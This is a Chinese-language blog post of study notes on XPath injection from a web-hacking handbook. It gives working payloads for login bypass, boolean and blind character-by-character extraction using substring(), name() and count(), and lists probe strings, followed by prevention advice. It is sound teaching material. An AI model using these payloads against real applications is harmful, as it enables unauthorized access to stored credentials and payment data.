---
layout:     post
title:      Chapter 9 Attacking Data Stores(4)-Injecting into XPath 
subtitle:   XPath注入
date:       2020-03-15
author:     D
header-img: 
catalog: true
mermaid: true
tags: [web hacking]
---

参考:**The Web Application Hackers Handbook** Chapter 9

XML路径语言（XPath）是一种解释语言，用于浏览XML文档并从其中检索数据。 在大多数情况下，XPath表达式表示从文档的一个节点导航到另一个节点所需的一系列步骤。

当Web应用程序将数据存储在XML文档中时，它们可以使用XPath来访问数据，以响应用户提供的输入。 如果将此输入插入XPath查询而没有任何过滤或清理，则攻击者可能能够操纵查询来干扰应用程序的逻辑或检索未经其授权的数据。

XML文档通常不是用于存储企业数据的首选工具。 但是，它们经常用于存储可根据用户输入检索的应用程序配置数据。 较小的应用程序也可以使用它们来保留简单的信息，例如用户凭据，角色和特权。

考虑以下XML数据存储：
```
<addressBook>
	<address>
		<firstName>William</firstName>
		<surname>Gates</surname>
		<password>MSRocks!</password>
		<email>billyg@microsoft.com</email>
		<ccard>5130 8190 3282 3515</ccard>
	</address>
	<address>
		<firstName>Chris</firstName>
		<surname>Dawes</surname>
		<password>secret</password>
		<email>cdawes@craftnet.de</email>
		<ccard>3981 2491 3242 3121</ccard>
	</address>
	<address>
		<firstName>James</firstName>
		<surname>Hunter</surname>
		<password>letmein</password>
		<email>james.hunter@pookmail.com</email>
		<ccard>8113 5320 8014 3313</ccard>
	</address>
</addressBook>
```
检索所有电子邮件地址的XPath查询如下所示：
```
//address/email/text()
```
查询以返回用户Dawes的所有详细信息，如下所示：
```
//address[surname/text()='Dawes']
```
在某些应用程序中，用户提供的数据可以直接嵌入XPath查询中，查询结果可以在应用程序的响应中返回，或用于确定应用程序行为的某些方面。

# 1.Subverting Application Logic

考虑一个应用程序功能，该功能可以根据用户名和密码来检索用户存储的信用卡号。 以下XPath查询可有效验证用户提供的凭据并检索相关用户的信用卡号：
```
//address[surname/text()='Dawes' and password/text()='secret']/ccard/text()
```
在这种情况下，攻击者可能能够以与SQL注入流相同的方式来破坏应用程序的查询。 例如，提供具有以下值的密码：
```
' or 'a'='a
```
导致以下XPath查询，该查询检索所有用户的信用卡详细信息：
```
//address[surname/text()='Dawes' and password/text()='' or 'a'='a']/ccard/text()
```
**NOTE**
- 与SQL注入一样，注入数字值时不需要单引号。
- 与SQL查询不同，XPath查询中的关键字区分大小写，XML文档本身中的元素名称也区分大小写。

# 2.Informed XPath Injection

可以利用XPath注入漏洞从目标XML文档中检索任意信息。 一种可靠的方式使用与SQL注入中所述相同的技术，以使应用程序以不同的方式响应，具体取决于攻击者指定的条件.

提交以下两个密码将导致应用程序行为不同。 在第一种情况下返回结果，但在第二种情况下不返回：
```
' or 1=1 and 'a'='a
' or 1=2 and 'a'='a
```
可以利用这种行为上的差异来测试任何指定条件的真实性，因此可以一次提取一个字节的任意信息。 与SQL一样，XPath语言包含一个子字符串函数，该函数可用于一次测试一个字符的字符串值。 例如，提供此密码：
```
' or //address[surname/text()='Gates' and substring(password/text(),1,1)='M'] and 'a'='a
```
返回以下XPath查询，如果Gates用户密码的第一个字符为M，则返回查询结果：
```
//address[surname/text()='Dawes' and password/text()='' or
//address[surname/text()='Gates' and substring(password/text(),1,1)= 'M']
and 'a'='a ']/ccard/text()
```
通过循环遍历每个角色的位置并测试每个可能的值，攻击者可以提取盖茨密码的全部值。

# 3.Blind XPath Injection

在刚刚描述的攻击中，注入的测试条件既指定了提取数据的绝对路径（地址），又指定了目标字段的名称（姓氏和密码）。 实际上，有可能在不拥有此信息的情况下发起完全盲目的攻击。 XPath查询可以包含相对于XML文档中当前节点的步骤，因此可以从当前节点导航到父节点或特定的子节点。 此外，XPath包含用于查询有关文档的元信息的功能，包括特定元素的名称。 使用这些技术，可以提取文档中所有节点的名称和值，而无需了解有关其结构或内容的任何先验信息。

例如，您可以使用前面介绍的子字符串技术，通过提供以下形式的一系列密码来提取当前节点的父节点的名称：
```
' or substring(name(parent::*[position()=1]),1,1)= 'a
```
该输入生成结果，因为地址节点的第一个字母是a。 继续到第二个字母，您可以通过提供以下密码来确认这是正确的，最后一个密码将生成结果：
```
' or substring(name(parent::*[position()=1]),2,1)='a
' or substring(name(parent::*[position()=1]),2,1)='b
' or substring(name(parent::*[position()=1]),2,1)='c
' or substring(name(parent::*[position()=1]),2,1)='d
```
建立地址节点的名称后，您可以循环浏览其每个子节点，提取其所有名称和值。 通过索引指定相关的子节点避免了知道任何节点名称的需要。 例如，以下查询返回值Hunter:
```
//address[position()=3]/child::node()[position()=4]/text()
```
然后以下查询返回值letmein：
```
//address[position()=3]/child::node()[position()=6]/text()
```
通过精心设计一个通过索引指定目标节点的注入条件，该技术可用于完全盲目的攻击中，在该响应中应用程序的响应中不会返回任何结果。 例如，如果盖茨的密码的第一个字符为M，则提供以下密码将返回结果
```
' or substring(//address[position()=1]/child::node()[position()=6]/text(),1,1)= 'M' and 'a'='a
```
通过循环遍历每个地址节点的每个子节点，并一次提取一个字符来提取其值，可以提取XML数据存储的全部内容。

**TIP**
XPath包含两个有用的功能，这些功能可以帮助您自动化前面的攻击并快速遍历XML文档中的所有节点和数据：
- count()返回给定元素的子节点数，可用于确定要迭代的position()值的范围。
- string-length()返回提供的字符串的长度，该长度可用于确定要迭代的substring()值的范围。

# 4.Finding XPath Injection Flaws

当提交给易受XPath注入攻击的函数时，许多通常用于探测SQL注入缺陷的攻击字符串通常会导致异常行为。 例如，以下两个字符串之一通常会使XPath查询语法无效并生成错误：
```
'
'--
```
以下一个或多个字符串通常会导致应用程序行为发生某些变化而不会导致错误，其方式与处理SQL注入漏洞时相同：
```
' or 'a'='a
' and 'a'='b
or 1=1
and 1=2
```
因此，在任何情况下，如果您的SQL注入测试为该漏洞提供了初步证据，但您无法最终利用该漏洞，则应调查处理XPath注入漏洞的可能性。

**HACK STEPS**
- 1.尝试提交以下值，并确定这些值是否导致不同的应用程序行为，而不会引起错误：
```
' or count(parent::*[position()=1])=0 or 'a'='b
' or count(parent::*[position()=1])>0 or 'a'='b
```
如果参数是数字，请尝试以下测试字符串：
```
1 or count(parent::*[position()=1])=0
1 or count(parent::*[position()=1])>0
```
- 2.如果上述任何字符串在应用程序内引起差异行为而不会引起错误，则很可能可以通过设计测试条件来一次提取一个字节的信息来提取任意数据。 使用以下格式的一系列条件来确定当前节点的父节点的名称：
```
substring(name(parent::*[position()=1]),1,1)='a'
```
- 3.提取父节点的名称后，使用以下格式的一系列条件提取XML树中的所有数据：
```
substring(//parentnodename[position()=1]/child::node()[position()=1]/text(),1,1)='a'
```

# 5.Preventing XPath Injection

如果您认为有必要将用户提供的输入插入XPath查询中，则应仅对可以进行严格输入验证的简单数据项执行此操作。 应该对照可接受的字符白名单检查用户输入，理想情况下，白名单应仅包含字母数字字符。 应该阻止可能用于干扰XPath查询的字符，包括`( ) = ' [ ] ： ， *  /`以及所有`空格`。任何与白名单不匹配的输入都应被拒绝而不是清除。

[Chapter 9 Attacking Data Stores(3)-Injecting into NoSQL](https://dm116.github.io/2020/03/15/attacking-data-stores_3/)<br>
[Chapter 9 Attacking Data Stores(5)-Injecting into LDAP](https://dm116.github.io/2020/03/15/attacking-data-stores_5/)<br>
